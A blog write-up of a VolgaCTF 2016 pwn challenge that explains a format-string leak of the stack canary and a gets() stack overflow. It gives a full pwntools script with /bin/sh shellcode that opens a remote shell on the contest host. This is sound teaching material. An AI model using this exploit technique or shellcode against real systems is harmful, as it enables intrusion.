---
layout: post
title: "VolgaCTF - Web of Science"
date: 2016-03-29 00:00
categories: ctf exploit
---

VolgaCTF had *only* three pwnable challenges that were base on the same binary.
Their idea was to increase the difficulty little by little by adding security
features at each phase:

1. The first one had neither ALSR nor NX activated
2. The second one had no ASLR, but NX was activated
3. The third one had ASLR and NX activated

However all of them had stack canaries.

Here is the write-up of the first one, the other two will follow shortly.

# Basic information

From the organizers:
{% highlight text %}
Web of Science

By the name of this service, it is the early version of the well-known
scientific search engine. Curiously, it's still working.

nc webofscience.2016.volgactf.ru 45678
{% endhighlight %}

The binary is a stripped ELF 64bit with only canaries activated:

{% highlight shell-session %}
$ file web_of_science
web_of_science: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux
2.6.24, BuildID[sha1]=85e0df26435ee411258ad39668c9700b1ebadec9, stripped

$ checksec --file web_of_science
RELRO
Partial RELRO

STACK CANARY
Canary found

NX
NX disabled

PIE
No PIE

RPATH
No RPATH

RUNPATH
No RUNPATH
{% endhighlight %}

## Operation

The binary starts by asking a name and then propose ten additions to ensure
that the client is used by a human:
{% highlight shell-session %}
$ ./web_of_science 
Tell me your name first
AAAA
Alright, pass a little test first, would you.
4819 + 29245 = ?
AAAA, your response: 
44177 + 8986 = ?
AAAA, your response: 
2629 + 13231 = ?
AAAA, your response: 
18140 + 8664 = ?
AAAA, your response: 
23999 + 25224 = ?
AAAA, your response: 
9519 + 2809 = ?
AAAA, your response: 
19080 + 27322 = ?
AAAA, your response: 
24371 + 53502 = ?
AAAA, your response: 
62003 + 62516 = ?
AAAA, your response: 
14911 + 26740 = ?
AAAA, your response: 
Service is provided for humans only!
{% endhighlight %}

If the ten additions are correctly answered, the service proposes to create
papers with various attributes. That part is not important for the first two
binaries because the exploitation is done beforehand.

## Vulnerabilities

There are at least two vulnerabilities:

1. string format on the name;
2. stack buffer overflow on the responses to the ten additions.

The string format vulnerability could be used to overwrite the saved `rip`
pointer, but a more simple approach is to use the string format vulnerability
to leak a stack address and the canary and then use the stack buffer overflow
to send the shellcode, rewrite the canary and overwrite the saved `rip` pointer
to the address of the beginning of the shellcode.

## Exploitation

### String format

When asked for a name,  formats can be injected into it. When the name is
printed using `printf`, it will be passed as the first argument `format`, 
the formats injected will be interpreted and information on the stack will be
leaked. [More information][strfmt]

For example to leak data as pointers:

{% highlight shell-session %}
$ nc webofscience.2016.volgactf.ru 45678
Tell me your name first
%p.%p.%p.%p
Alright, pass a little test first, would you.
65444 + 20678 = ?
0x7fffffffc350.0x7ffff7dd59e0.0xffffffffffffffff.0x7ffff7ff0740, your response:
{% endhighlight %}

To leak the canary, 43 `%p` are needed and to leak a stack address, 46 are
needed:
{% highlight shell-session %}
$ nc webofscience.2016.volgactf.ru 45678
Tell me your name first
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Alright, pass a little test first, would you.
18268 + 48901 = ?
0x7fffffffc350.0x7ffff7dd59e0.0xffffffffffffffff.0x7ffff7ff0740.0x7ffff7dd3140.
0x1060307d.0xa00000000.0xbf050000475c.0x10661.0x70252e70252e7025.0x252e70252e70
252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e7
0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0
x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e
70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x72756f79202c2e70.0x736e6
f7073657220.0x7fff00203a65.0x1.(nil).0x7fffffffeb50.0x7ffff7a19bf8.(nil).0x7fff
ffffebb0.0x4006e0.0x7ffff7df0515.0x56f9966a.0x7ffff7a51eee.(nil).0x74aae6ccf7dd
59e0.(nil).0x8ac179d6caf69500.0x4006e0.(nil).0x7fffffffebb0., your response:
{% endhighlight %}

### Stack buffer overflow

The `gets` function reads a line (i.e a string terminated by a carriage return)
into a buffer passed as argument. The problem with that function is that no
size is given to limit the amount of data to be copied, therefore it is
possible to write passed the end of the buffer to the saved `rip` pointer. When
the execution returns from the current function, it will continue execution at
the address that has been written over saved `rip` and the control flow can
therefore be hijacked.

The [calling convention][callconv] for Linux on x86-64 architecture shows that
the first argument passed to a function is stored in the register `rdi`. The
call to `gets` is done at `0x40092b`. If we break execution in a debugger, we
would be able to read the address of the buffer.

Here is a quick look of the function that asks for the response to the
addition:
{% highlight ca65 %}
$ r2 -A web_of_science
 -- Unk, unk, unk, unk
[0x004006e0]> pdf @0x40092b
[snip]
|      ||   0x00400921      488d8560ffff.  lea rax, qword [rbp - local_a0h]
|      ||   0x00400928      4889c7         mov rdi, rax
|      ||   0x0040092b      e870fdffff     call sym.imp.gets
[snip]
|       `-> 0x004009a1      4881c4380100.  add rsp, 0x138
|           0x004009a8      5b             pop rbx
|           0x004009a9      5d             pop rbp
\           0x004009aa      c3             ret
{% endhighlight %}

Instead of injecting 46 `%p`, I set the argument number in the format:
{% highlight shell-session %}
$ gdb -q web_of_science
Reading symbols from web_of_science...(no debugging symbols found)...done.
(gdb) b *0x40092b
Breakpoint 1 at 0x40092b
(gdb) r
Starting program: /home/abe/ctf/volga/pwn_web_of_science/web_of_science 
Tell me your name first
|%43$p|%46$p|
Alright, pass a little test first, would you.
57028 + 19889 = ?
|0x99bc45114f471300|0x7fffffffdce0|, your response:
Breakpoint 1, 0x000000000040092b in ?? ()
(gdb) i r
rax            0x7fffffffdc20	140737488346144
rbx            0x722072756f79202c	8223698768285474860
rcx            0x7ffff7b12c50	140737348971600
rdx            0x7ffff7dd5760	140737351866208
rsi            0x7fffffffb4f0	140737488336112
rdi            0x7fffffffdc20	140737488346144
[snip]
{% endhighlight %}

The address of the buffer here is `0x7fffffffdc20` (it might differ on your
system but this is not important). Note that the canary is equal to
`0x9ce2bb4ec57b1300` and the leaked stack address `0x7fffffffdce0`

Let's have look at the layout of the stack:
{% highlight shell-session %}
(gdb) i frame
Stack level 0, frame at 0x7fffffffdcd0:
 rip = 0x40092b; saved rip = 0x401015
 called by frame at 0x7fffffffdcf0
 Arglist at 0x7fffffffdb78, args: 
 Locals at 0x7fffffffdb78, Previous frame's sp is 0x7fffffffdcd0
 Saved registers:
  rbx at 0x7fffffffdcb8, rbp at 0x7fffffffdcc0, rip at 0x7fffffffdcc8
(gdb) x/42gx $rsp
0x7fffffffdb80:	0x0000000000000000	0x0000000a00000000
0x7fffffffdb90:	0x0000b1410000ba8f	0x0000000000016bd0
0x7fffffffdba0:	0x257c70243334257c	0x79202c7c70243634
0x7fffffffdbb0:	0x707365722072756f	0x0000203a65736e6f
0x7fffffffdbc0:	0x0000000000000000	0x0000000000000000
0x7fffffffdbd0:	0x0000000000000000	0x0000000000000000
0x7fffffffdbe0:	0x0000000000000000	0x0000000000000000
0x7fffffffdbf0:	0x0000000000000000	0x0000000000000000
0x7fffffffdc00:	0x0000000000000000	0x0000000000000000
0x7fffffffdc10:	0x0000000000000000	0x0000000000000000
0x7fffffffdc20:	0x2f2f2f2f2f2f2f2f	0x2f2f2f2f2f2f2f2f
0x7fffffffdc30:	0x0000000000000000	0x0000000000000000
0x7fffffffdc40:	0x0000ff0000000000	0x0000000000000000
0x7fffffffdc50:	0x0000000000000000	0x0000000000000000
0x7fffffffdc60:	0x0000000056fa1730	0x00000000fbad0087
0x7fffffffdc70:	0x0000000000000000	0x00007ffff7dd5760
0x7fffffffdc80:	0x0000000056fa1730	0x00007ffff7a6e956
0x7fffffffdc90:	0x0000000000000000	0x2939c881f7aa7fa9
0x7fffffffdca0:	0x0000000000000000	0x112a139772971400
0x7fffffffdcb0:	0x00000000004006e0	0x0000000000000000
0x7fffffffdcc0:	0x00007fffffffdce0	0x0000000000401015
{% endhighlight %}

Saved `rip`is at `0x7fffffffdcc8`. If we go up the stack, we can see the leaked
stack address at `0x7fffffffdcc0` and the  canary at `0x7fffffffdca8`, which give us:

* distance between the leaked stack address and the beginning of the buffer:
  `0x7fffffffdce0 - 0x7fffffffdc20 = 192` bytes

* distance between the beginning of the buffer and the canary:
  `0x7fffffffdca8 - 0x7fffffffdc20 = 136` bytes

### Payload creation

Here is a summary of all the steps:

1. inject formats into the name to leak data on the stack
2. get the canary and leaked stack address
3. answer the 9 additions (no need to answer them correctly)
4. construct the payload and send it as the last addition response
5. the binary will return on the address of the shellcode

The payload is built as follow:

* 136 bytes containing the shellcode and some padding
* canary
* 24 bytes of padding
* leaked stack address minus 192

Here is the full python script that uses [pwntools] library:
{% highlight python %}
#!/usr/bin/env python2

from pwn import *

HOST = 'webofscience.2016.volgactf.ru'
PORT = 45678

leak = '|%43$p|%46$p|'
# source http://shell-storm.org/shellcode/files/shellcode-77.php
shellcode  = '\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62'
shellcode += '\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31'
shellcode += '\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c'
shellcode += '\x58\x0f\x05'

r = remote(HOST, PORT)

log.info('Sending leak')
r.sendline(leak)
data = r.recvuntil('your response:')
data = data.split('|')
canary = int(data[1], 16)
stack_addr = int(data[2], 16)
log.info('leaked canary: {}'.format(hex(canary)))
log.info('leaked stack addr: {}'.format(hex(stack_addr)))
for i in range(0,9):
    log.info('Sending calc #{}'.format(i))
    r.sendline(str(i))
    r.recv()
log.info('Sending payload')
payload = shellcode + (136 - len(shellcode)) * 'A' + p64(canary) + 3 * p64(0x0) + p64(stack_addr - 192)
r.sendline(payload)
r.clean()
r.interactive()
{% endhighlight %}

And the exploitation:
{% highlight shell-session %}
$ python2 payload.py 
[+] Opening connection to webofscience.2016.volgactf.ru on port 45678: Done
[*] Sending leak
[*] leaked canary: 0x910766cd33bbf600
[*] leaked stack ptr: 0x7fffffffebb0
[*] Sending calc #0
[*] Sending calc #1
[*] Sending calc #2
[*] Sending calc #3
[*] Sending calc #4
[*] Sending calc #5
[*] Sending calc #6
[*] Sending calc #7
[*] Sending calc #8
[*] Sending payload
[*] Switching to interactive mode
$ ls
flag_wos.txt
install
start_wos
web_of_science
$ cat flag_wos.txt
VolgaCTF{executable_st@ck_doesnt_cause_@ny_problems_d0es_it}
{% endhighlight %}

Well ASLR could have been activated, it would not have changed anything...

[strfmt]: https://www.owasp.org/index.php/Format_string_attack
[callconv]: https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI
[pwntools]: https://github.com/Gallopsled/pwntools
